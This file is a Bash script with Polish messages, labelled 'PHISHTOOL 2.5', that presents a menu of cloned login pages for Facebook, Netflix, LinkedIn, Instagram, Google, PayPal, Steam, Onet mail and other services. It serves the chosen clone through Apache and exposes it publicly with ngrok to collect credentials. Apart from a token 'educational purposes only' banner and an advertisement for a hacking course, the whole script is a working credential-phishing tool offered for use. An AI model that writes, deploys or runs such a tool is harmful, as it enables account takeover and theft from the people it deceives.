#!/bin/bash
sudo service apache2 start


facebook_login_page()
{
	echo "wybrales fb";
	sudo rm /var/www/html/index.html
	sudo cp facebook/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

poczta_onetlogin_page()
{
	echo "wybrales fb";
	sudo rm /var/www/html/index.html
	sudo cp onet/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}




facebook_secure_login_page()
{
	echo "wybrales fb";
	sudo rm /var/www/html/index.html
	sudo cp fb_secure/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}



netflix_login_page()
{
	echo "wybrales Netflixa";
	sudo rm /var/www/html/index.html
	sudo cp netflix/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

linkedin_login_page()
{
	echo "wybrales Linkedin";
	sudo rm /var/www/html/index.html
	sudo cp linkedin/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}
instagram_login_page()
{
	echo "wybrales Instagram";
	sudo rm /var/www/html/index.html
	sudo cp instagram/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}
snapchat_login_page()
{
	echo "wybrales Snapchat";
	sudo rm /var/www/html/index.html
	sudo cp snapchat/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

github_login_page()
{
	echo "wybrales Github";
	sudo rm /var/www/html/index.html
	sudo cp github/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

google_login_page()
{
	echo "wybrales Google";
	sudo rm /var/www/html/index.html
	sudo cp google/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html

}

paypal_login_page()
{
	echo "wybrales Paypal";
	sudo rm /var/www/html/index.html
	sudo cp paypal/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html

}

messenger_login_page()
{
	echo "wybrales messenger";
	sudo rm /var/www/html/index.html
	sudo cp messenger/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

steam_login_page()
{
	echo "wybrales steam'a";
	sudo rm /var/www/html/index.html
	sudo cp steam/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

exit_work()
{
	exit
}

figlet PHISHTOOL 2.5
echo " ------------------------------------------------------------------------------ "
echo "   Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.5"
echo "   Uzywaj tylko do celow naukowych.                                             "
echo " ------------------------------------------------------------------------------ "
echo -e "\e[5m  KUP KURS NA WWW.EHAKER.PL \e[0m"
echo "Wybierz opcje"
echo "================="
echo -e "\e[31m  [1] Facebook\e[0m"
echo -e "\e[31m  [2] Netflix\e[0m"
echo -e "\e[31m  [3] Linkedin\e[0m"
echo -e "\e[31m  [4] Instagram\e[0m"
echo -e "\e[31m  [5] Snapchat\e[0m"
echo -e "\e[31m  [6] Github\e[0m"
echo -e "\e[31m  [7] Google\e[0m"
echo -e "\e[31m  [8] PayPal\e[0m"
echo -e "\e[31m  [9] Messenger\e[0m"
echo -e "\e[31m  [10] Steam\e[0m"
echo -e "\e[31m  [11] Facebook Secure Page\e[0m"
echo -e "\e[31m  [11] Poczta Onet\e[0m"
echo -e "\e[92m  [13] EXIT \e[0m"
echo "================="


read opcja
 

case "$opcja" in


  "1") facebook_login_page ;;
  "2") netflix_login_page ;;
  "3") linkedin_login_page ;;
  "4") instagram_login_page ;;
  "5") snapchat_login_page ;;
  "6") github_login_page ;;
  "7") google_login_page ;;
  "8") paypal_login_page ;;
  "9") messenger_login_page ;;
  "10") steam_login_page ;;
  "11") facebook_secure_login_page ;;
  "12") poczta_onetlogin_page ;;
  "13") exit_work ;;
  *)  clear && ./run.sh
  
esac

echo " Narzędzie zakończyło pracę "
sudo service apache2 stop
sleep 2
exit

